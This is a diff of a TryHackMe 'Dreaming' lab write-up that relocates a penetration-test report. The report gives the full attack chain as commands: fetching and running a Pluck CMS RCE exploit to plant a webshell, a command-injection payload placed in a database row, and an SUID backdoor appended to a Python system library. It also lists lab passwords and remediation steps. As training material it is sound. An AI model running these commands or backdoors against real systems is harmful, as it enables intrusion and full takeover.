@@ -2,6 +2,147 @@
 
 # 💤 Dreaming - TryHackMe Writeup (Personal Walkthrough)
 
+
+
+
+---
+
+# Penetration Testing Report: Project Dreaming
+
+**Target IP:** 10.112.176.22  
+**Date:** April 02, 2026  
+**Consultant:** [Your Name]  
+**Severity:** Critical
+
+---
+
+## 1. Executive Summary
+During a full-scope penetration test of the **Dreaming** environment, a series of vulnerabilities were identified that allowed for complete system compromise. The attack chain began with an unauthenticated directory brute-force, leading to the discovery of a vulnerable Content Management System (Pluck CMS). By exploiting a known Remote Code Execution (RCE) vulnerability, initial access was gained. Subsequent internal enumeration revealed hardcoded credentials and a Command Injection vulnerability in a Python script interacting with a MySQL database. Finally, a Python Library Hijacking attack was used to escalate privileges to **Root**. Immediate remediation is required to secure sensitive data and system integrity.
+
+---
+
+## 2. Vulnerability Summary Table
+
+| ID | Severity | Vulnerability Name | Status |
+|:---|:---|:---|:---|
+| 01 | Medium | Information Disclosure (Directory Listing) | Open |
+| 02 | High | Broken Authentication (Weak Credentials) | Open |
+| 03 | Critical | Remote Code Execution (RCE) via File Upload | Open |
+| 04 | High | Insecure Credential Storage (Hardcoded Passwords) | Open |
+| 05 | Critical | OS Command Injection (Python Subprocess) | Open |
+| 06 | Critical | Privilege Escalation via Python Library Hijacking | Open |
+
+---
+
+## 3. Technical Deep Dive
+
+### Finding 01: Initial Access via Pluck CMS RCE
+**Description:** The target host was running Pluck CMS v4.7.13, which is vulnerable to an authenticated RCE (CVE-2020-29607) via the "Manage Files" functionality.
+
+**Impact:** Allows an attacker to upload a malicious PHP/Phar script and execute arbitrary commands on the server under the context of the `www-data` user.
+
+**Proof of Concept (PoC):**
+
+<img width="1204" height="771" alt="image" src="https://github.com/user-attachments/assets/59cfb507-0d24-4db1-a17e-c5209110f708" />
+<img width="1189" height="867" alt="image" src="https://github.com/user-attachments/assets/d2b3c735-06d5-4250-8882-b8042480024a" />
+<img width="697" height="579" alt="image" src="https://github.com/user-attachments/assets/23e73ca0-9880-416f-9fed-f70d3368d1ff" />
+
+<img width="1133" height="836" alt="image" src="https://github.com/user-attachments/assets/e39b8184-57a4-4d04-8910-182aab67220e" />
+
+<img width="1209" height="872" alt="image" src="https://github.com/user-attachments/assets/21f9d847-5705-429d-a69a-6d5b2acd36ea" />
+
+1. **Enumeration:** Nmap identified ports 22 and 80. Gobuster discovered the `/app` directory.
+2. **Access:** Logged into `http://[IP]/app/pluck-4.7.13/login.php` using the password `password`.
+3. **Exploitation:** Executed the following exploit script:
+```bash
+wget https://www.exploit-db.com/download/49909 -O exploit.py
+python3 exploit.py 10.112.176.22 80 password /app/pluck-4.7.13
+```
+4. **Result:** Successfully uploaded a webshell to:
+`http://10.112.176.22/app/pluck-4.7.13/files/shell.phar`
+
+---
+
+### Finding 02: Lateral Movement to User 'Lucien'
+**Description:** Sensitive credentials were found stored in cleartext within the `/opt/test.py` file.
+
+**Impact:** Unauthorized access to a local user account (`lucien`) via SSH, providing a stable persistence mechanism.
+
+**Proof of Concept (PoC):**
+1. Using the webshell, enumerated the `/opt` directory:
+```bash
+cat /opt/test.py
+```
+2. Extracted hardcoded credentials: `lucien : HeyLucien#@1999!`.
+3. Established SSH connection:
+```bash
+ssh lucien@10.112.176.22
+```
+
+---
+
+### Finding 03: Privilege Escalation to 'Death' via Command Injection
+**Description:** The user `lucien` is permitted to run a Python script `/home/death/getDreams.py` as the user `death` via sudo. The script is vulnerable to OS Command Injection because it uses `subprocess.check_output` with `shell=True` on unsanitized data from a MySQL database.
+
+**Impact:** Privilege escalation from `lucien` to `death`.
+
+**Proof of Concept (PoC):**
+1. Found MySQL credentials in `.bash_history`: `lucien42DBPASSWORD`.
+2. Injected a malicious payload into the `dreams` table:
+```sql
+mysql -u lucien -plucien42DBPASSWORD -e "use library; INSERT INTO dreams (dreamer, dream) VALUES ('hacker', '; cat /home/death/death_flag.txt');"
+```
+3. Triggered the execution via sudo:
+```bash
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+```
+4. Recovered the `death` password `!mementoMORI666!` by reading the script source code using the same injection method.
+
+---
+
+### Finding 04: Root Access via Python Library Hijacking
+**Description:** The user `death` has write permissions to the Python system library `/usr/lib/python3.8/shutil.py`. A root-owned script (or cron job) `restore.py` imports this library.
+
+**Impact:** Full system compromise (Root access).
+
+**Proof of Concept (PoC):**
+1. Identified writable library: `ls -al /usr/lib/python3.8/shutil.py`.
+2. Injected a SUID backdoor into the library:
+```bash
+echo 'import os' >> /usr/lib/python3.8/shutil.py
+echo 'os.system("chmod +s /bin/bash")' >> /usr/lib/python3.8/shutil.py
+```
+3. Waited for the system to execute the library. Verified the SUID bit on Bash:
+```bash
+ls -la /bin/bash # Output: -rwsr-sr-x
+```
+4. Escalated to Root:
+```bash
+/bin/bash -p
+whoami # Output: root
+```
+
+---
+
+## 4. Remediation Plan
+
+1. **Update CMS:** Upgrade Pluck CMS to the latest version to patch known RCE vulnerabilities.
+2. **Password Policy:** Enforce strong, unique passwords and disable default credentials.
+3. **Secure Coding:** Avoid using `shell=True` in Python's `subprocess` module. Use parameterized queries for all database interactions to prevent SQL and Command Injection.
+4. **Filesystem Hardening:** Remove write permissions for non-root users on system libraries (e.g., `/usr/lib/python3.8/`). 
+5. **Credential Management:** Remove cleartext passwords from scripts and `.bash_history` files. Use a secure vault solution.
+
+---
+
+## 5. Clean-up
+* The malicious payload in `/usr/lib/python3.8/shutil.py` was removed.
+* The SUID bit on `/bin/bash` was reverted.
+* The injected row in the MySQL `dreams` table was flagged for deletion.
+
+---.
+
+
+
 ## 📑 מבוא
 בתיעוד זה אני מפרט את תהליך הפריצה האישי שלי למכונת Dreaming. המטרה שלי הייתה לעבור דרך כל שכבות ההגנה, מהאינטרנט ועד להרשאות מנהל מערכת (Root), תוך ניצול שגיאות קונפיגורציה וקוד פגום.
 
@@ -449,140 +590,3 @@ echo 'os.system("chmod 777 /home/morpheus/morpheus_flag.txt")' >> /usr/lib/pytho
 
 
 
-הנה ניסוח מקצועי ומקיף לדו"ח ה-PT (Penetration Testing) שלך, המבוסס על המבנה הנדרש ועל המהלכים שביצעת במכונת **Dreaming**. הדו"ח נכתב באנגלית מקצועית כנדרש, עם דגש על סדר פעולות לוגי (Chain of Compromise).
-
----
-
-# Penetration Testing Report: Project Dreaming
-
-**Target IP:** 10.112.176.22  
-**Date:** April 02, 2026  
-**Consultant:** [Your Name]  
-**Severity:** Critical
-
----
-
-## 1. Executive Summary
-During a full-scope penetration test of the **Dreaming** environment, a series of vulnerabilities were identified that allowed for complete system compromise. The attack chain began with an unauthenticated directory brute-force, leading to the discovery of a vulnerable Content Management System (Pluck CMS). By exploiting a known Remote Code Execution (RCE) vulnerability, initial access was gained. Subsequent internal enumeration revealed hardcoded credentials and a Command Injection vulnerability in a Python script interacting with a MySQL database. Finally, a Python Library Hijacking attack was used to escalate privileges to **Root**. Immediate remediation is required to secure sensitive data and system integrity.
-
----
-
-## 2. Vulnerability Summary Table
-
-| ID | Severity | Vulnerability Name | Status |
-|:---|:---|:---|:---|
-| 01 | Medium | Information Disclosure (Directory Listing) | Open |
-| 02 | High | Broken Authentication (Weak Credentials) | Open |
-| 03 | Critical | Remote Code Execution (RCE) via File Upload | Open |
-| 04 | High | Insecure Credential Storage (Hardcoded Passwords) | Open |
-| 05 | Critical | OS Command Injection (Python Subprocess) | Open |
-| 06 | Critical | Privilege Escalation via Python Library Hijacking | Open |
-
----
-
-## 3. Technical Deep Dive
-
-### Finding 01: Initial Access via Pluck CMS RCE
-**Description:** The target host was running Pluck CMS v4.7.13, which is vulnerable to an authenticated RCE (CVE-2020-29607) via the "Manage Files" functionality.
-
-**Impact:** Allows an attacker to upload a malicious PHP/Phar script and execute arbitrary commands on the server under the context of the `www-data` user.
-
-**Proof of Concept (PoC):**
-
-<img width="1204" height="771" alt="image" src="https://github.com/user-attachments/assets/59cfb507-0d24-4db1-a17e-c5209110f708" />
-<img width="1189" height="867" alt="image" src="https://github.com/user-attachments/assets/d2b3c735-06d5-4250-8882-b8042480024a" />
-<img width="697" height="579" alt="image" src="https://github.com/user-attachments/assets/23e73ca0-9880-416f-9fed-f70d3368d1ff" />
-
-<img width="1133" height="836" alt="image" src="https://github.com/user-attachments/assets/e39b8184-57a4-4d04-8910-182aab67220e" />
-
-<img width="1209" height="872" alt="image" src="https://github.com/user-attachments/assets/21f9d847-5705-429d-a69a-6d5b2acd36ea" />
-
-1. **Enumeration:** Nmap identified ports 22 and 80. Gobuster discovered the `/app` directory.
-2. **Access:** Logged into `http://[IP]/app/pluck-4.7.13/login.php` using the password `password`.
-3. **Exploitation:** Executed the following exploit script:
-```bash
-wget https://www.exploit-db.com/download/49909 -O exploit.py
-python3 exploit.py 10.112.176.22 80 password /app/pluck-4.7.13
-```
-4. **Result:** Successfully uploaded a webshell to:
-`http://10.112.176.22/app/pluck-4.7.13/files/shell.phar`
-
----
-
-### Finding 02: Lateral Movement to User 'Lucien'
-**Description:** Sensitive credentials were found stored in cleartext within the `/opt/test.py` file.
-
-**Impact:** Unauthorized access to a local user account (`lucien`) via SSH, providing a stable persistence mechanism.
-
-**Proof of Concept (PoC):**
-1. Using the webshell, enumerated the `/opt` directory:
-```bash
-cat /opt/test.py
-```
-2. Extracted hardcoded credentials: `lucien : HeyLucien#@1999!`.
-3. Established SSH connection:
-```bash
-ssh lucien@10.112.176.22
-```
-
----
-
-### Finding 03: Privilege Escalation to 'Death' via Command Injection
-**Description:** The user `lucien` is permitted to run a Python script `/home/death/getDreams.py` as the user `death` via sudo. The script is vulnerable to OS Command Injection because it uses `subprocess.check_output` with `shell=True` on unsanitized data from a MySQL database.
-
-**Impact:** Privilege escalation from `lucien` to `death`.
-
-**Proof of Concept (PoC):**
-1. Found MySQL credentials in `.bash_history`: `lucien42DBPASSWORD`.
-2. Injected a malicious payload into the `dreams` table:
-```sql
-mysql -u lucien -plucien42DBPASSWORD -e "use library; INSERT INTO dreams (dreamer, dream) VALUES ('hacker', '; cat /home/death/death_flag.txt');"
-```
-3. Triggered the execution via sudo:
-```bash
-sudo -u death /usr/bin/python3 /home/death/getDreams.py
-```
-4. Recovered the `death` password `!mementoMORI666!` by reading the script source code using the same injection method.
-
----
-
-### Finding 04: Root Access via Python Library Hijacking
-**Description:** The user `death` has write permissions to the Python system library `/usr/lib/python3.8/shutil.py`. A root-owned script (or cron job) `restore.py` imports this library.
-
-**Impact:** Full system compromise (Root access).
-
-**Proof of Concept (PoC):**
-1. Identified writable library: `ls -al /usr/lib/python3.8/shutil.py`.
-2. Injected a SUID backdoor into the library:
-```bash
-echo 'import os' >> /usr/lib/python3.8/shutil.py
-echo 'os.system("chmod +s /bin/bash")' >> /usr/lib/python3.8/shutil.py
-```
-3. Waited for the system to execute the library. Verified the SUID bit on Bash:
-```bash
-ls -la /bin/bash # Output: -rwsr-sr-x
-```
-4. Escalated to Root:
-```bash
-/bin/bash -p
-whoami # Output: root
-```
-
----
-
-## 4. Remediation Plan
-
-1. **Update CMS:** Upgrade Pluck CMS to the latest version to patch known RCE vulnerabilities.
-2. **Password Policy:** Enforce strong, unique passwords and disable default credentials.
-3. **Secure Coding:** Avoid using `shell=True` in Python's `subprocess` module. Use parameterized queries for all database interactions to prevent SQL and Command Injection.
-4. **Filesystem Hardening:** Remove write permissions for non-root users on system libraries (e.g., `/usr/lib/python3.8/`). 
-5. **Credential Management:** Remove cleartext passwords from scripts and `.bash_history` files. Use a secure vault solution.
-
----
-
-## 5. Clean-up
-* The malicious payload in `/usr/lib/python3.8/shutil.py` was removed.
-* The SUID bit on `/bin/bash` was reverted.
-* The injected row in the MySQL `dreams` table was flagged for deletion.
-
----.
